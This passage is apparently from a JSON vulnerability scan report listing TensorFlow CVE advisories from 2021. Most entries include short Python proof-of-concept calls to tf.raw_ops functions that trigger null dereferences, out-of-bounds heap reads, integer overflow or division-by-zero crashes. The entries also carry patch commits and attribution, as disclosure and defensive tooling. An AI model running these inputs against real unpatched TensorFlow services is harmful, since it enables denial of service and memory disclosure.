                "markdown": "**Vulnerability CVE-2021-37647**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.5.0|[CVE-2021-37647](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37647)|\n\n### Impact\nWhen a user does not supply arguments that determine a valid sparse tensor, `tf.raw_ops.SparseTensorSliceDataset` implementation can be made to dereference a null pointer:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.SparseTensorSliceDataset(\n  indices=[[],[],[]],\n  values=[1,2,3],\n  dense_shape=[3,3])\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/data/sparse_tensor_slice_dataset_op.cc#L240-L251) has some argument validation but fails to consider the case when either `indices` or `values` are provided for an empty sparse tensor when the other is not.\n\nIf `indices` is empty (as in the example above), then [code that performs validation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/data/sparse_tensor_slice_dataset_op.cc#L260-L261) (i.e., checking that the indices are monotonically increasing) results in a null pointer dereference: \n\n```cc\n    for (int64_t i = 0; i \u003c indices-\u003edim_size(0); ++i) {\n      int64_t next_batch_index = indices-\u003ematrix\u003cint64\u003e()(i, 0);\n      ...\n    }\n```\n\nIf `indices` as provided by the user is empty, then `indices` in the C++ code above is backed by an empty `std::vector`, hence calling `indices-\u003edim_size(0)` results in null pointer dereferencing (same as calling `std::vector::at()` on an empty vector).\n\n### Patches\nWe have patched the issue in GitHub commit [02cc160e29d20631de3859c6653184e3f876b9d7](https://github.com/tensorflow/tensorflow/commit/02cc160e29d20631de3859c6653184e3f876b9d7).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.7",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-37658",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37658"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37658",
              "help": {
                "text": "Vulnerability CVE-2021-37658\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37658](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37658)\n### Impact\nAn attacker can cause undefined behavior via binding a reference to null pointer in all operations of type `tf.raw_ops.MatrixSetDiagV*`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.MatrixSetDiagV3(\n  input=[1,2,3],\n  diagonal=[1,1],\n  k=[],\n  align=`RIGHT_LEFT`)\n```\n  \nThe  [implementation](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/linalg/matrix_diag_op.cc) has incomplete validation that the value of `k` is a valid tensor. We have check that this value is either a scalar or a vector, but there is no check for the number of elements. If this is an empty tensor, then code that accesses the first element of the tensor is wrong: \n\n```cc \n  auto\u0026 diag_index = context-\u003einput(1);\n  ...\n  lower_diag_index = diag_index.flat\u003cint32\u003e()(0);\n```\n  \n### Patches\nWe have patched the issue in GitHub commit [ff8894044dfae5568ecbf2ed514c1a37dc394f1b](https://github.com/tensorflow/tensorflow/commit/ff8894044dfae5568ecbf2ed514c1a37dc394f1b).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37658**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37658](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37658)|\n\n### Impact\nAn attacker can cause undefined behavior via binding a reference to null pointer in all operations of type `tf.raw_ops.MatrixSetDiagV*`:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.MatrixSetDiagV3(\n  input=[1,2,3],\n  diagonal=[1,1],\n  k=[],\n  align=`RIGHT_LEFT`)\n```\n  \nThe  [implementation](https://github.com/tensorflow/tensorflow/blob/84d053187cb80d975ef2b9684d4b61981bca0c41/tensorflow/core/kernels/linalg/matrix_diag_op.cc) has incomplete validation that the value of `k` is a valid tensor. We have check that this value is either a scalar or a vector, but there is no check for the number of elements. If this is an empty tensor, then code that accesses the first element of the tensor is wrong: \n\n```cc \n  auto\u0026 diag_index = context-\u003einput(1);\n  ...\n  lower_diag_index = diag_index.flat\u003cint32\u003e()(0);\n```\n  \n### Patches\nWe have patched the issue in GitHub commit [ff8894044dfae5568ecbf2ed514c1a37dc394f1b](https://github.com/tensorflow/tensorflow/commit/ff8894044dfae5568ecbf2ed514c1a37dc394f1b).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37672",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37672"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37672",
              "help": {
                "text": "Vulnerability CVE-2021-37672\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37672](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37672)\n### Impact\nAn attacker can read from outside of bounds of heap allocated data by sending specially crafted illegal arguments to `tf.raw_ops.SdcaOptimizerV2`:\n\n```python\nimport tensorflow as tf\n  \ntf.raw_ops.SdcaOptimizerV2(\n  sparse_example_indices=[[1]],\n  sparse_feature_indices=[[1]],\n  sparse_feature_values=[[1.0,2.0]],\n  dense_features=[[1.0]],\n  example_weights=[1.0],\n  example_labels=[],\n  sparse_indices=[1],\n  sparse_weights=[1.0],\n  dense_weights=[[1.0]],\n  example_state_data=[[100.0,100.0,100.0,100.0]],\n  loss_type=`logistic_loss`,\n  l1=100.0,\n  l2=100.0,\n  num_loss_partitions=1,\n  num_inner_iterations=1,\n  adaptive=True)       \n``` \n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/sdca_internal.cc#L320-L353) does not check that the length of `example_labels` is the same as the number of examples.\n\n### Patches\nWe have patched the issue in GitHub commit [a4e138660270e7599793fa438cd7b2fc2ce215a6](https://github.com/tensorflow/tensorflow/commit/a4e138660270e7599793fa438cd7b2fc2ce215a6).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37672**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37672](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37672)|\n\n### Impact\nAn attacker can read from outside of bounds of heap allocated data by sending specially crafted illegal arguments to `tf.raw_ops.SdcaOptimizerV2`:\n\n```python\nimport tensorflow as tf\n  \ntf.raw_ops.SdcaOptimizerV2(\n  sparse_example_indices=[[1]],\n  sparse_feature_indices=[[1]],\n  sparse_feature_values=[[1.0,2.0]],\n  dense_features=[[1.0]],\n  example_weights=[1.0],\n  example_labels=[],\n  sparse_indices=[1],\n  sparse_weights=[1.0],\n  dense_weights=[[1.0]],\n  example_state_data=[[100.0,100.0,100.0,100.0]],\n  loss_type=`logistic_loss`,\n  l1=100.0,\n  l2=100.0,\n  num_loss_partitions=1,\n  num_inner_iterations=1,\n  adaptive=True)       \n``` \n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/sdca_internal.cc#L320-L353) does not check that the length of `example_labels` is the same as the number of examples.\n\n### Patches\nWe have patched the issue in GitHub commit [a4e138660270e7599793fa438cd7b2fc2ce215a6](https://github.com/tensorflow/tensorflow/commit/a4e138660270e7599793fa438cd7b2fc2ce215a6).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37646",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37646"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37646",
              "help": {
                "text": "Vulnerability CVE-2021-37646\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37646](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37646)\n### Impact\nThe implementation of `tf.raw_ops.StringNGrams` is vulnerable to an integer overflow issue caused by converting a signed integer value to an unsigned one and then allocating memory based on this value.\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.StringNGrams(\n  data=[``,``],\n  data_splits=[0,2],\n  separator=` `*100,\n  ngram_widths=[-80,0,0,-60],\n  left_pad=` `,\n  right_pad=` `,\n  pad_width=100,\n  preserve_short_sequences=False)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/string_ngrams_op.cc#L184) calls `reserve` on a `tstring` with a value that sometimes can be negative if user supplies negative `ngram_widths`. The `reserve` method calls `TF_TString_Reserve` which has an `unsigned long` argument for the size of the buffer. Hence, the implicit conversion transforms the negative value to a large integer.\n\n### Patches\nWe have patched the issue in GitHub commit [c283e542a3f422420cfdb332414543b62fc4e4a5](https://github.com/tensorflow/tensorflow/commit/c283e542a3f422420cfdb332414543b62fc4e4a5).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37646**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37646](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37646)|\n\n### Impact\nThe implementation of `tf.raw_ops.StringNGrams` is vulnerable to an integer overflow issue caused by converting a signed integer value to an unsigned one and then allocating memory based on this value.\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.StringNGrams(\n  data=[``,``],\n  data_splits=[0,2],\n  separator=` `*100,\n  ngram_widths=[-80,0,0,-60],\n  left_pad=` `,\n  right_pad=` `,\n  pad_width=100,\n  preserve_short_sequences=False)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/string_ngrams_op.cc#L184) calls `reserve` on a `tstring` with a value that sometimes can be negative if user supplies negative `ngram_widths`. The `reserve` method calls `TF_TString_Reserve` which has an `unsigned long` argument for the size of the buffer. Hence, the implicit conversion transforms the negative value to a large integer.\n\n### Patches\nWe have patched the issue in GitHub commit [c283e542a3f422420cfdb332414543b62fc4e4a5](https://github.com/tensorflow/tensorflow/commit/c283e542a3f422420cfdb332414543b62fc4e4a5).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37670",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37670"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37670",
              "help": {
                "text": "Vulnerability CVE-2021-37670\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37670](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37670)\n### Impact\nAn attacker can read from outside of bounds of heap allocated data by sending specially crafted illegal arguments to `tf.raw_ops.UpperBound`:\n\n```python\nimport tensorflow as tf\n  \ntf.raw_ops.UpperBound(\n  sorted_input=[1,2,3],\n  values=tf.constant(value=[[0,0,0],[1,1,1],[2,2,2]],dtype=tf.int64),\n  out_type=tf.int64)\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/searchsorted_op.cc#L85-L104) does not validate the rank of `sorted_input` argument:\n\n```cc\n  void Compute(OpKernelContext* ctx) override {\n    const Tensor\u0026 sorted_inputs_t = ctx-\u003einput(0);\n    // ...\n    OP_REQUIRES(ctx, sorted_inputs_t.dim_size(0) == values_t.dim_size(0),\n                Status(error::INVALID_ARGUMENT,\n                       \"Leading dim_size of both tensors must match.\"));\n    // ...\n    if (output_t-\u003edtype() == DT_INT32) {\n      OP_REQUIRES(ctx,\n                  FastBoundsCheck(sorted_inputs_t.dim_size(1), ...));\n      // ...\n    }\n```\n\nAs we access the first two dimensions of `sorted_inputs_t` tensor, it must have rank at least 2.\n\nA similar issue occurs in `tf.raw_ops.LowerBound`.\n\n### Patches\nWe have patched the issue in GitHub commit [42459e4273c2e47a3232cc16c4f4fff3b3a35c38](https://github.com/tensorflow/tensorflow/commit/42459e4273c2e47a3232cc16c4f4fff3b3a35c38).\n  \nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n  \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-37670**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37670](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37670)|\n\n### Impact\nAn attacker can read from outside of bounds of heap allocated data by sending specially crafted illegal arguments to `tf.raw_ops.UpperBound`:\n\n```python\nimport tensorflow as tf\n  \ntf.raw_ops.UpperBound(\n  sorted_input=[1,2,3],\n  values=tf.constant(value=[[0,0,0],[1,1,1],[2,2,2]],dtype=tf.int64),\n  out_type=tf.int64)\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/searchsorted_op.cc#L85-L104) does not validate the rank of `sorted_input` argument:\n\n```cc\n  void Compute(OpKernelContext* ctx) override {\n    const Tensor\u0026 sorted_inputs_t = ctx-\u003einput(0);\n    // ...\n    OP_REQUIRES(ctx, sorted_inputs_t.dim_size(0) == values_t.dim_size(0),\n                Status(error::INVALID_ARGUMENT,\n                       \"Leading dim_size of both tensors must match.\"));\n    // ...\n    if (output_t-\u003edtype() == DT_INT32) {\n      OP_REQUIRES(ctx,\n                  FastBoundsCheck(sorted_inputs_t.dim_size(1), ...));\n      // ...\n    }\n```\n\nAs we access the first two dimensions of `sorted_inputs_t` tensor, it must have rank at least 2.\n\nA similar issue occurs in `tf.raw_ops.LowerBound`.\n\n### Patches\nWe have patched the issue in GitHub commit [42459e4273c2e47a3232cc16c4f4fff3b3a35c38](https://github.com/tensorflow/tensorflow/commit/42459e4273c2e47a3232cc16c4f4fff3b3a35c38).\n  \nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n  \n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37674",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37674"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37674",
              "help": {
                "text": "Vulnerability CVE-2021-37674\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37674](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37674)\n### Impact\nAn attacker can trigger a denial of service via a segmentation fault in `tf.raw_ops.MaxPoolGrad` caused by missing validation:\n\n```python\nimport tensorflow as tf\n  \ntf.raw_ops.MaxPoolGrad(\n  orig_input = tf.constant([], shape=[3, 0, 0, 2], dtype=tf.float32),\n  orig_output = tf.constant([], shape=[3, 0, 0, 2], dtype=tf.float32),\n  grad = tf.constant([], shape=[3, 0, 0, 2], dtype=tf.float32),\n  ksize = [1, 16, 16, 1],\n  strides = [1, 16, 18, 1],\n  padding = \"EXPLICIT\",\n  explicit_paddings = [0, 0, 14, 3, 15, 5, 0, 0])\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/maxpooling_op.cc) misses some validation for the `orig_input` and `orig_output` tensors.\n\nThe fixes for [CVE-2021-29579](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-068.md) were incomplete.\n                                                                                                                                                                                                                                                                                          \n### Patches\nWe have patched the issue in GitHub commit [136b51f10903e044308cf77117c0ed9871350475](https://github.com/tensorflow/tensorflow/commit/136b51f10903e044308cf77117c0ed9871350475).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang of Baidu Security.",
                "markdown": "**Vulnerability CVE-2021-37674**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37674](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37674)|\n\n### Impact\nAn attacker can trigger a denial of service via a segmentation fault in `tf.raw_ops.MaxPoolGrad` caused by missing validation:\n\n```python\nimport tensorflow as tf\n  \ntf.raw_ops.MaxPoolGrad(\n  orig_input = tf.constant([], shape=[3, 0, 0, 2], dtype=tf.float32),\n  orig_output = tf.constant([], shape=[3, 0, 0, 2], dtype=tf.float32),\n  grad = tf.constant([], shape=[3, 0, 0, 2], dtype=tf.float32),\n  ksize = [1, 16, 16, 1],\n  strides = [1, 16, 18, 1],\n  padding = \"EXPLICIT\",\n  explicit_paddings = [0, 0, 14, 3, 15, 5, 0, 0])\n```\n  \nThe [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/kernels/maxpooling_op.cc) misses some validation for the `orig_input` and `orig_output` tensors.\n\nThe fixes for [CVE-2021-29579](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-068.md) were incomplete.\n                                                                                                                                                                                                                                                                                          \n### Patches\nWe have patched the issue in GitHub commit [136b51f10903e044308cf77117c0ed9871350475](https://github.com/tensorflow/tensorflow/commit/136b51f10903e044308cf77117c0ed9871350475).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang of Baidu Security."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37675",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37675"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37675",
              "help": {
                "text": "Vulnerability CVE-2021-37675\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37675](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37675)\n### Impact\nMost implementations of convolution operators in TensorFlow are affected by a division by 0 vulnerability where an attacker can trigger a denial of service via a crash:\n\n```python\nimport tensorflow as tf\n\ntf.compat.v1.disable_v2_behavior()\ntf.raw_ops.Conv2D(\n  input = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32),\n  filter = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32),\n  strides = [1, 1, 1, 1],\n  padding = \"SAME\")\n```\n\nThe shape inference [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/framework/common_shape_fns.cc#L577) is missing several validations before doing divisions and modulo operations.\n\n### Patches\nWe have patched the issue in GitHub commit [8a793b5d7f59e37ac7f3cd0954a750a2fe76bad4](https://github.com/tensorflow/tensorflow/commit/8a793b5d7f59e37ac7f3cd0954a750a2fe76bad4).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang of Baidu Security.",
                "markdown": "**Vulnerability CVE-2021-37675**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37675](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37675)|\n\n### Impact\nMost implementations of convolution operators in TensorFlow are affected by a division by 0 vulnerability where an attacker can trigger a denial of service via a crash:\n\n```python\nimport tensorflow as tf\n\ntf.compat.v1.disable_v2_behavior()\ntf.raw_ops.Conv2D(\n  input = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32),\n  filter = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32),\n  strides = [1, 1, 1, 1],\n  padding = \"SAME\")\n```\n\nThe shape inference [implementation](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/core/framework/common_shape_fns.cc#L577) is missing several validations before doing divisions and modulo operations.\n\n### Patches\nWe have patched the issue in GitHub commit [8a793b5d7f59e37ac7f3cd0954a750a2fe76bad4](https://github.com/tensorflow/tensorflow/commit/8a793b5d7f59e37ac7f3cd0954a750a2fe76bad4).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang of Baidu Security."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37682",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37682"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37682",
              "help": {
                "text": "Vulnerability CVE-2021-37682\nSeverity: medium\nFixed Version: 2.5.0\nLink: [CVE-2021-37682](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37682)\n### Impact\nAll TFLite operations that use quantization can be made to use unitialized values. [For example](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/lite/kernels/depthwise_conv.cc#L198-L200):\n\n```cc\n    const auto* affine_quantization =\n        reinterpret_cast\u003cTfLiteAffineQuantization*\u003e(\n            filter-\u003equantization.params);\n```\n\nThe issue stems from the fact that `quantization.params` is only valid if `quantization.type` is different that `kTfLiteNoQuantization`. However, these checks are missing in large parts of the code.\n\n### Patches\nWe have patched the issue in GitHub commits [537bc7c723439b9194a358f64d871dd326c18887](https://github.com/tensorflow/tensorflow/commit/537bc7c723439b9194a358f64d871dd326c18887),\n[4a91f2069f7145aab6ba2d8cfe41be8a110c18a5](https://github.com/tensorflow/tensorflow/commit/4a91f2069f7145aab6ba2d8cfe41be8a110c18a5) and [8933b8a21280696ab119b63263babdb54c298538](https://github.com/tensorflow/tensorflow/commit/8933b8a21280696ab119b63263babdb54c298538).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution \nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360. ",
                "markdown": "**Vulnerability CVE-2021-37682**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.5.0|[CVE-2021-37682](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37682)|\n\n### Impact\nAll TFLite operations that use quantization can be made to use unitialized values. [For example](https://github.com/tensorflow/tensorflow/blob/460e000de3a83278fb00b61a16d161b1964f15f4/tensorflow/lite/kernels/depthwise_conv.cc#L198-L200):\n\n```cc\n    const auto* affine_quantization =\n        reinterpret_cast\u003cTfLiteAffineQuantization*\u003e(\n            filter-\u003equantization.params);\n```\n\nThe issue stems from the fact that `quantization.params` is only valid if `quantization.type` is different that `kTfLiteNoQuantization`. However, these checks are missing in large parts of the code.\n\n### Patches\nWe have patched the issue in GitHub commits [537bc7c723439b9194a358f64d871dd326c18887](https://github.com/tensorflow/tensorflow/commit/537bc7c723439b9194a358f64d871dd326c18887),\n[4a91f2069f7145aab6ba2d8cfe41be8a110c18a5](https://github.com/tensorflow/tensorflow/commit/4a91f2069f7145aab6ba2d8cfe41be8a110c18a5) and [8933b8a21280696ab119b63263babdb54c298538](https://github.com/tensorflow/tensorflow/commit/8933b8a21280696ab119b63263babdb54c298538).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution \nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360. "
              },
              "properties": {
                "security-severity": "4.4",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-37671",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-37671"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-37671",
              "help": {
